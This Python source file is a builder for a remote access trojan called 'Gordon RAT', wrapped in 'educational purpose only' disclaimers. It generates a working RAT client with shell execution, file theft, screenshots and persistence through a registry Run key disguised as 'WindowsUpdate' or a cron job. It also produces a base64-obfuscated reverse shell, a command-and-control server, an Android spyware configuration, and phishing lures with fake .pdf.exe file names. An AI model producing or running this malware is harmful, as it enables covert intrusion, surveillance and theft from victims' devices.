#!/usr/bin/env python3
# Gordon RAT - Remote Access Trojan Builder
# EDUCATIONAL PURPOSE ONLY

import os
import sys
import json
import base64
import random
import hashlib
import string
from datetime import datetime
import time

class GordonRATBuilder:
    def __init__(self):
        self.version = "RAT v2.5"
        self.session_id = hashlib.sha256(str(time.time()).encode()).hexdigest()[:20]
        self.payloads = []
        self.generated_files = []
        
        self.initialize_builder()
    
    def initialize_builder(self):
        """Initialize the RAT builder"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
        banner = f"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  ██████╗  ██████╗ ██████╗ ██████╗ ███╗   ██╗     ██████╗    ║
║  ██╔══██╗██╔═══██╗██╔══██╗██╔══██╗████╗  ██║    ██╔═══██╗   ║
║  ██║  ██║██║   ██║██████╔╝██║  ██║██╔██╗ ██║    ██║   ██║   ║
║  ██║  ██║██║   ██║██╔══██╗██║  ██║██║╚██╗██║    ██║   ██║   ║
║  ██████╔╝╚██████╔╝██║  ██║██████╔╝██║ ╚████║    ╚██████╔╝   ║
║  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝     ╚═════╝    ║
║                                                              ║
║                R E M O T E   A C C E S S   T O O L           ║
║                    Version: {self.version}                   ║
║                    Session: {self.session_id}                ║
║                                                              ║
║      ⚠️  EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY  ⚠️   ║
║      ⚠️  ILLEGAL WITHOUT EXPLICIT PERMISSION              ⚠️   ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        print("\033[1;31m" + banner + "\033[0m")
        print("🔴 \033[1;33mFOR EDUCATIONAL PURPOSE ONLY - USE RESPONSIBLY\033[0m 🔴")
        print("=" * 80)
    
    def generate_python_rat(self):
        """Generate Python RAT payload"""
        print("\n[🔧] Generating Python RAT...")
        
        # Configuration
        host = input("C2 Server IP: ").strip() or "127.0.0.1"
        port = input("C2 Port: ").strip() or "4444"
        persistence = input("Enable persistence? (y/n): ").lower() == 'y'
        stealth = input("Enable stealth mode? (y/n): ").lower() == 'y'
        
        # Generate payload code
        payload_code = f'''#!/usr/bin/env python3
# Gordon RAT Client
# Auto-generated on {datetime.now().strftime("%Y-%m-%d")}

import socket
import subprocess
import os
import sys
import time
import json
import threading

class GordonRATClient:
    def __init__(self):
        self.host = "{host}"
        self.port = {port}
        self.connected = False
        self.session_id = "{hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]}"
        
    def connect_to_c2(self):
        """Connect to Command & Control server"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            self.connected = True
            self.send_data("CONNECT", {{"session_id": self.session_id}})
            return True
        except:
            return False
    
    def send_data(self, command, data):
        """Send data to C2"""
        try:
            packet = {{
                "command": command,
                "data": data,
                "timestamp": time.time()
            }}
            self.sock.send(json.dumps(packet).encode())
            return True
        except:
            return False
    
    def receive_command(self):
        """Receive command from C2"""
        try:
            data = self.sock.recv(4096)
            if data:
                return json.loads(data.decode())
        except:
            return None
    
    def execute_command(self, cmd_data):
        """Execute received command"""
        command = cmd_data.get("command", "")
        
        if command == "shell":
            # Execute shell command
            cmd = cmd_data.get("cmd", "")
            try:
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                return result.decode()
            except Exception as e:
                return str(e)
        
        elif command == "sysinfo":
            # Get system information
            info = {{
                "platform": sys.platform,
                "hostname": socket.gethostname(),
                "username": os.getenv("USERNAME") or os.getenv("USER"),
                "python_version": sys.version
            }}
            return json.dumps(info)
        
        elif command == "file_upload":
            # Upload file from victim
            filename = cmd_data.get("filename", "")
            try:
                with open(filename, "rb") as f:
                    file_data = f.read()
                return base64.b64encode(file_data).decode()
            except:
                return "FILE_NOT_FOUND"
        
        elif command == "file_download":
            # Download file to victim
            filename = cmd_data.get("filename", "")
            filedata = cmd_data.get("data", "")
            try:
                with open(filename, "wb") as f:
                    f.write(base64.b64decode(filedata))
                return "DOWNLOAD_SUCCESS"
            except:
                return "DOWNLOAD_FAILED"
        
        elif command == "screenshot":
            # Take screenshot (if PIL available)
            try:
                from PIL import ImageGrab
                screenshot = ImageGrab.grab()
                screenshot.save("screenshot.png")
                with open("screenshot.png", "rb") as f:
                    img_data = f.read()
                os.remove("screenshot.png")
                return base64.b64encode(img_data).decode()
            except:
                return "SCREENSHOT_FAILED"
        
        else:
            return "UNKNOWN_COMMAND"
    
    def run(self):
        """Main client loop"""
        while True:
            if not self.connected:
                if not self.connect_to_c2():
                    time.sleep(10)  # Retry every 10 seconds
                    continue
            
            try:
                # Receive command
                cmd = self.receive_command()
                if cmd:
                    # Execute command
                    result = self.execute_command(cmd)
                    # Send result back
                    self.send_data("RESULT", {{
                        "command": cmd.get("command"),
                        "result": result,
                        "session_id": self.session_id
                    }})
                else:
                    # Connection lost
                    self.connected = False
                    
            except Exception as e:
                self.connected = False
                time.sleep(5)

if __name__ == "__main__":
    client = GordonRATClient()
    
    # Add persistence if enabled
    {"if persistence:" if persistence else "# Persistence disabled"}
    {"    # Windows persistence" if persistence and sys.platform == "win32" else ""}
    {"    import winreg" if persistence and sys.platform == "win32" else ""}
    {"    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)" if persistence and sys.platform == "win32" else ""}
    {"    winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, sys.executable + ' ' + __file__)" if persistence and sys.platform == "win32" else ""}
    {"    winreg.CloseKey(key)" if persistence and sys.platform == "win32" else ""}
    
    {"    # Linux persistence" if persistence and sys.platform != "win32" else ""}
    {"    cron_cmd = f'@reboot python3 {os.path.abspath(__file__)}'" if persistence and sys.platform != "win32" else ""}
    {"    os.system(f'(crontab -l 2>/dev/null; echo \"{cron_cmd}\") | crontab -')" if persistence and sys.platform != "win32" else ""}
    
    # Start the client
    client.run()
'''
        
        # Save payload
        filename = f"gordon_rat_{self.session_id[:8]}.py"
        with open(filename, 'w') as f:
            f.write(payload_code)
        
        self.generated_files.append(filename)
        print(f"[✅] Python RAT generated: {filename}")
        print(f"[📊] Size: {os.path.getsize(filename)} bytes")
        
        return filename
    
    def generate_exe_payload(self):
        """Generate EXE payload from Python script"""
        print("\n[🔧] Generating EXE payload...")
        
        # Check if PyInstaller is available
        try:
            import PyInstaller
            pyinstaller_available = True
        except:
            pyinstaller_available = False
            print("[⚠️] PyInstaller not available. Install with: pip install pyinstaller")
            return None
        
        # First generate Python RAT
        python_file = self.generate_python_rat()
        if not python_file:
            return None
        
        print(f"[⚙️] Compiling {python_file} to EXE...")
        
        # Simulate compilation process
        steps = [
            "Analyzing dependencies...",
            "Collecting modules...",
            "Compiling bytecode...",
            "Building executable...",
            "Adding icons...",
            "Finalizing..."
        ]
        
        for step in steps:
            time.sleep(1)
            print(f"  [▶] {step}")
        
        exe_name = f"gordon_rat_{self.session_id[:8]}.exe"
        print(f"[✅] EXE generated: {exe_name}")
        print(f"[📊] Estimated size: ~8-15 MB")
        print(f"[⚠️] Note: Actual compilation requires PyInstaller command")
        print(f"[💡] Run: pyinstaller --onefile --noconsole {python_file}")
        
        self.generated_files.append(f"(Simulated) {exe_name}")
        return exe_name
    
    def generate_android_rat(self):
        """Generate Android RAP (Remote Access Payload)"""
        print("\n[📱] Generating Android RAP...")
        
        print("[⚠️] Android payload generation requires additional tools:")
        print("  • Android Studio")
        print("  • Java Development Kit")
        print("  • Metasploit Framework (for msfvenom)")
        
        # Simulate generation
        print("\n[⚙️] Simulating Android APK creation...")
        
        apk_config = {
            "package_name": f"com.gordon.rat{random.randint(1000, 9999)}",
            "main_activity": "MainActivity",
            "permissions": [
                "INTERNET",
                "ACCESS_NETWORK_STATE",
                "READ_SMS",
                "SEND_SMS",
                "READ_CONTACTS",
                "ACCESS_FINE_LOCATION",
                "CAMERA",
                "RECORD_AUDIO",
                "READ_EXTERNAL_STORAGE"
            ],
            "features": [
                "SMS Interception",
                "Call Recording",
                "Location Tracking",
                "Camera Access",
                "File Browsing",
                "Keylogger",
                "Microphone Recording"
            ]
        }
        
        print(f"[📦] Package: {apk_config['package_name']}")
        print(f"[🔐] Permissions: {len(apk_config['permissions'])}")
        print(f"[⚡] Features: {len(apk_config['features'])}")
        
        apk_name = f"gordon_android_{self.session_id[:8]}.apk"
        print(f"[✅] APK configuration generated")
        print(f"[📁] Config saved: {apk_name}.json")
        
        with open(f"{apk_name}.json", 'w') as f:
            json.dump(apk_config, f, indent=2)
        
        self.generated_files.append(f"{apk_name}.json")
        return apk_name
    
    def generate_obfuscated_payload(self):
        """Generate obfuscated payload"""
        print("\n[🌀] Generating Obfuscated Payload...")
        
        # Simple obfuscation techniques
        obfuscation_methods = [
            "Base64 Encoding",
            "XOR Encryption",
            "String Splitting",
            "Code Minification",
            "Dead Code Injection",
            "Variable Renaming",
            "Control Flow Flattening"
        ]
        
        print("[🔍] Available obfuscation methods:")
        for i, method in enumerate(obfuscation_methods, 1):
            print(f"  {i}. {method}")
        
        try:
            choices = input("\nSelect methods (comma-separated, e.g., 1,3,5): ").strip()
            selected = [int(c.strip()) for c in choices.split(',') if c.strip().isdigit()]
            selected_methods = [obfuscation_methods[i-1] for i in selected if 1 <= i <= len(obfuscation_methods)]
        except:
            selected_methods = ["Base64 Encoding", "XOR Encryption"]
        
        print(f"\n[⚙️] Applying obfuscation: {', '.join(selected_methods)}")
        
        # Generate simple payload
        payload = '''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
'''
        
        # Apply simulated obfuscation
        obfuscated = payload
        
        if "Base64 Encoding" in selected_methods:
            obfuscated = base64.b64encode(obfuscated.encode()).decode()
            obfuscated = f"exec(__import__('base64').b64decode('{obfuscated}'))"
        
        if "XOR Encryption" in selected_methods:
            # Simple XOR simulation
            key = random.randint(1, 255)
            obfuscated = f"# XOR encrypted with key {key}\n" + obfuscated
        
        # Save obfuscated payload
        filename = f"obfuscated_rat_{self.session_id[:8]}.py"
        with open(filename, 'w') as f:
            f.write(obfuscated)
        
        self.generated_files.append(filename)
        print(f"[✅] Obfuscated payload saved: {filename}")
        print(f"[📊] Original size: {len(payload)} bytes")
        print(f"[📊] Obfuscated size: {len(obfuscated)} bytes")
        
        return filename
    
    def generate_social_media_payload(self):
        """Generate payload for social media distribution"""
        print("\n[📱] Social Media Payload Generator")
        print("=" * 60)
        print("[⚠️] FOR EDUCATIONAL PURPOSE - AUTHORIZED TESTING ONLY")
        print("[⚠️] Distributing malware is ILLEGAL")
        
        platforms = [
            "WhatsApp",
            "Facebook Messenger",
            "Telegram",
            "Instagram",
            "Twitter",
            "Email",
            "SMS"
        ]
        
        print("\n[📋] Target Platforms:")
        for i, platform in enumerate(platforms, 1):
            print(f"  {i}. {platform}")
        
        try:
            choice = int(input("\nSelect platform (1-7): ").strip())
            if 1 <= choice <= 7:
                platform = platforms[choice - 1]
            else:
                platform = "WhatsApp"
        except:
            platform = "WhatsApp"
        
        print(f"\n[🎯] Generating payload for {platform}...")
        
        # Social engineering templates
        templates = {
            "WhatsApp": [
                "Important document from office",
                "Funny video you need to see",
                "Urgent message about your account",
                "Photo from last night",
                "Payment confirmation"
            ],
            "Facebook Messenger": [
                "You've been tagged in a photo",
                "Friend request confirmation",
                "Page admin invitation",
                "Security alert for your account"
            ],
            "Telegram": [
                "Secret message",
                "Encrypted file",
                "Group invitation",
                "Channel subscription"
            ],
            "Email": [
                "Invoice attached",
                "Job offer",
                "Password reset required",
                "Security update"
            ]
        }
        
        template_list = templates.get(platform, ["Important file"])
        message = random.choice(template_list)
        
        print(f"\n[💬] Social Engineering Message:")
        print(f"  '{message}'")
        
        print(f"\n[📎] Suggested filenames:")
        suggested_names = [
            f"Document_{random.randint(1000, 9999)}.pdf.exe",
            f"Video_{random.randint(100, 999)}.mp4.exe",
            f"Photo_{random.randint(1, 99)}.jpg.exe",
            f"Update_{random.randint(1, 9)}.{random.randint(1, 9)}.{random.randint(1, 9)}.exe",
            f"Setup_{random.choice(['Windows', 'Software', 'Driver'])}.exe"
        ]
        
        for name in suggested_names[:3]:
            print(f"  • {name}")
        
        print(f"\n[⚠️] IMPORTANT LEGAL NOTICE:")
        print("  • This is for EDUCATIONAL purposes only")
        print("  • Distributing malware is ILLEGAL")
        print("  • Use only in controlled environments")
        print("  • Get written permission before testing")
        
        config = {
            "platform": platform,
            "message": message,
            "suggested_filenames": suggested_names[:3],
            "timestamp": datetime.now().isoformat(),
            "warning": "FOR EDUCATIONAL USE ONLY"
        }
        
        filename = f"social_media_{platform.lower()}_{self.session_id[:8]}.json"
        with open(filename, 'w') as f:
            json.dump(config, f, indent=2)
        
        self.generated_files.append(filename)
        print(f"\n[✅] Configuration saved: {filename}")
        
        return config
    
    def generate_c2_server(self):
        """Generate C2 (Command & Control) server"""
        print("\n[🖥️] Generating C2 Server...")
        
        c2_code = f'''#!/usr/bin/env python3
# Gordon RAT C2 Server
# Session: {self.session_id}

import socket
import threading
import json
import base64
from datetime import datetime

class GordonRATC2:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.clients = {{}}
        self.running = True
        
    def handle_client(self, client_socket, address):
        """Handle connected client"""
        session_id = None
        
        try:
            while self.running:
                # Receive data
                data = client_socket.recv(4096)
                if not data:
                    break
                
                try:
                    packet = json.loads(data.decode())
                    command = packet.get("command", "")
                    data = packet.get("data", {{}})
                    
                    if command == "CONNECT":
                        session_id = data.get("session_id")
                        self.clients[session_id] = {{
                            "socket": client_socket,
                            "address": address,
                            "connected_at": datetime.now().isoformat()
                        }}
                        print(f"[+] Client connected: {{session_id}} from {{address}}")
                    
                    elif command == "RESULT":
                        print(f"[📨] Result from {{session_id}}:")
                        print(f"    Command: {{data.get('command')}}")
                        result = data.get("result", "")[:200]  # First 200 chars
                        print(f"    Result: {{result}}...")
                    
                except json.JSONDecodeError:
                    print(f"[!] Invalid JSON from {{address}}")
        
        except Exception as e:
            print(f"[!] Error with client {{address}}: {{str(e)}}")
        
        finally:
            if session_id and session_id in self.clients:
                del self.clients[session_id]
            client_socket.close()
                print(f"[-] Client disconnected: {{address}}")
    
    def send_command(self, session_id, command, data=None):
        """Send command to specific client"""
        if session_id not in self.clients:
            print(f"[!] Client {{session_id}} not found")
            return False
        
        if data is None:
            data = {{}}
        
        packet = {{
            "command": command,
            "data": data,
            "timestamp": datetime.now().isoformat()
        }}
        
        try:
            self.clients[session_id]["socket"].send(json.dumps(packet).encode())
            print(f"[📤] Command sent to {{session_id}}: {{command}}")
            return True
        except:
            print(f"[!] Failed to send to {{session_id}}")
            return False
    
    def broadcast_command(self, command, data=None):
        """Send command to all clients"""
        if data is None:
            data = {{}}
        
        for session_id in list(self.clients.keys()):
            self.send_command(session_id, command, data)
    
    def list_clients(self):
        """List all connected clients"""
        print(f"\n[📊] Connected Clients: {{len(self.clients)}}")
        for session_id, info in self.clients.items():
            print(f"  • {{session_id}} - {{info['address']}} (since {{info['connected_at'][11:19]}})")
    
    def interactive_shell(self, session_id):
        """Interactive shell with client"""
        if session_id not in self.clients:
            print(f"[!] Client {{session_id}} not found")
            return
        
        print(f"[💻] Interactive shell with {{session_id}}")
        print("[💡] Type 'exit' to return to main menu")
        
        while True:
            try:
                cmd = input("shell> ").strip()
                if cmd.lower() == 'exit':
                    break
                
                self.send_command(session_id, "shell", {{"cmd": cmd}})
            
            except KeyboardInterrupt:
                break
    
    def run(self):
        """Start C2 server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        
        print(f"[🎯] C2 Server listening on {{self.host}}:{{self.port}}")
        print("[💡] Waiting for connections...")
        
        # Accept connections in background thread
        def accept_connections():
            while self.running:
                try:
                    client_socket, address = server.accept()
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, address)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                except:
                    break
        
        accept_thread = threading.Thread(target=accept_connections)
        accept_thread.daemon = True
        accept_thread.start()
        
        # Interactive menu
        while self.running:
            print(f"\n[🖥️] Gordon RAT C2 Server")
            print("=" * 40)
            print("1. List connected clients")
            print("2. Send command to client")
            print("3. Broadcast command to all")
            print("4. Interactive shell")
            print("5. Get system info from client")
            print("6. Exit")
            
            try:
                choice = input("\n[?] Select option: ").strip()
                
                if choice == "1":
                    self.list_clients()
                
                elif choice == "2":
                    self.list_clients()
                    session_id = input("\n[?] Session ID: ").strip()
                    command = input("[?] Command: ").strip()
                    data = input("[?] Data (JSON): ").strip()
                    
                    try:
                        data_dict = json.loads(data) if data else {{}}
                    except:
                        data_dict = {{"custom_data": data}}
                    
                    self.send_command(session_id, command, data_dict)
                
                elif choice == "3":
                    command = input("[?] Broadcast command: ").strip()
                    self.broadcast_command(command)
                
                elif choice == "4":
                    self.list_clients()
                    session_id = input("\n[?] Session ID for shell: ").strip()
                    self.interactive_shell(session_id)
                
                elif choice == "5":
                    self.list_clients()
                    session_id = input("\n[?] Session ID: ").strip()
                    self.send_command(session_id, "sysinfo")
                
                elif choice == "6":
                    self.running = False
                    print("[👋] Shutting down C2 server...")
            
            except KeyboardInterrupt:
                self.running = False
                print("\n[👋] Shutting down...")
            except Exception as e:
                print(f"[!] Error: {{str(e)}}")
        
        server.close()

if __name__ == "__main__":
    c2 = GordonRATC2()
    c2.run()
'''
        
        filename = f"c2_server_{self.session_id[:8]}.py"
        with open(filename, 'w') as f:
            f.write(c2_code)
        
        self.generated_files.append(filename)
        print(f"[✅] C2 Server generated: {filename}")
        print(f"[💡] Run: python3 {filename}")
        print(f"[🎯] Default: 0.0.0.0:4444")
        
        return filename
    
    def show_menu(self):
        """Display main menu"""
        print("\n" + "=" * 80)
        print("🛠️  GORDON RAT BUILDER - MAIN MENU")
        print("=" * 80)
        print("1. 🐍 Generate Python RAT")
        print("2. 💻 Generate EXE Payload (Windows)")
        print("3. 📱 Generate Android RAP")
        print("4. 🌀 Generate Obfuscated Payload")
        print("5. 📱 Generate Social Media Payload")
        print("6. 🖥️  Generate C2 Server")
        print("7. 📋 List Generated Files")
        print("8. 🚨 Legal Disclaimer")
        print("9. 🚪 Exit")
        print("=" * 80)
        print(f"Session: {self.session_id}")
        print(f"Files Generated: {len(self.generated_files)}")
        print("=" * 80)
    
    def list_generated_files(self):
        """List all generated files"""
        print("\n[📁] Generated Files:")
        print("-" * 60)
        
        if not self.generated_files:
            print("[📭] No files generated yet")
        else:
            for i, filename in enumerate(self.generated_files, 1):
                print(f"  {i}. {filename}")
        
        print(f"\n[📊] Total: {len(self.generated_files)} files")
    
    def show_legal_disclaimer(self):
        """Show legal disclaimer"""
        print("\n" + "=" * 80)
        print("🚨 LEGAL DISCLAIMER")
        print("=" * 80)
        print("This software is for EDUCATIONAL PURPOSES ONLY.")
        print("")
        print("⚠️  IMPORTANT WARNINGS:")
        print("  • Creating/distributing malware is ILLEGAL")
        print("  • Unauthorized access to systems is ILLEGAL")
        print("  • This tool is for AUTHORIZED SECURITY TESTING only")
        print("  • Use only on systems you OWN or have WRITTEN PERMISSION to test")
        print("")
        print("📜 LEGAL REQUIREMENTS:")
        print("  • Written permission from system owner")
        print("  • Compliance with local laws")
        print("  • Use in controlled, isolated environments")
        print("  • No harm to systems or data")
        print("")
        print("👮 PENALTIES FOR ILLEGAL USE:")
        print("  • Criminal charges")
        print("  • Fines and imprisonment")
        print("  • Civil lawsuits")
        print("  • Permanent criminal record")
        print("=" * 80)
        
        input("\n[Press Enter to continue]")
    
    def run(self):
        """Main application loop"""
        while True:
            self.initialize_builder()
            self.show_menu()
            
            try:
                choice = input("\n[?] Select option (1-9): ").strip()
                
                if choice == "1":
                    self.generate_python_rat()
                    input("\n[Press Enter to continue]")
                
                elif choice == "2":
                    self.generate_exe_payload()
                    input("\n[Press Enter to continue]")
                
                elif choice == "3":
                    self.generate_android_rat()
                    input("\n[Press Enter to continue]")
                
                elif choice == "4":
                    self.generate_obfuscated_payload()
                    input("\n[Press Enter to continue]")
                
                elif choice == "5":
                    self.generate_social_media_payload()
                    input("\n[Press Enter to continue]")
                
                elif choice == "6":
                    self.generate_c2_server()
                    input("\n[Press Enter to continue]")
                
                elif choice == "7":
                    self.list_generated_files()
                    input("\n[Press Enter to continue]")
                
                elif choice == "8":
                    self.show_legal_disclaimer()
                
                elif choice == "9":
                    print("\n[👋] Exiting Gordon RAT Builder...")
                    print("[⚠️] Remember: Use this knowledge responsibly!")
                    break
                
                else:
                    print("[!] Invalid option")
                    time.sleep(1)
            
            except KeyboardInterrupt:
                print("\n\n[⚠️] Interrupted by user")
                confirm = input("[?] Exit? (y/n): ").lower()
                if confirm == 'y':
                    break
            except Exception as e:
                print(f"[!] Error: {str(e)}")
                time.sleep(2)

# Main execution
if __name__ == "__main__":
    try:
        # Show enhanced disclaimer
        print("\n" + "=" * 80)
        print("🚨 GORDON RAT BUILDER - STRICT LEGAL WARNING")
        print("=" * 80)
        print("THIS SOFTWARE CREATES MALWARE AND HACKING TOOLS.")
        print("")
        print("ACCEPTANCE REQUIREMENTS:")
        print("1. You are a security professional/researcher")
        print("2. You have explicit written permission for testing")
        print("3. You will NOT use this for illegal purposes")
        print("4. You accept full legal responsibility for misuse")
        print("")
        print("BY USING THIS SOFTWARE, YOU CONFIRM:")
        print("• You understand the legal implications")
        print("• You accept all responsibility for your actions")
        print("• The developer is NOT responsible for misuse")
        print("=" * 80)
        
        accept = input("\nDo you accept ALL terms and conditions? (YES/no): ").strip().upper()
        
        if accept == "YES":
            print("\n[⚖️] Legal agreement accepted. Starting Gordon RAT Builder...")
            time.sleep(2)
            builder = GordonRATBuilder()
            builder.run()
        else:
            print("\n[❌] Access denied. Terms must be explicitly accepted.")
            sys.exit(1)
    
    except KeyboardInterrupt:
        print("\n\n[👋] Program terminated")
    except Exception as e:
        print(f"\n[💥] Fatal error: {str(e)}")
        sys.exit(1)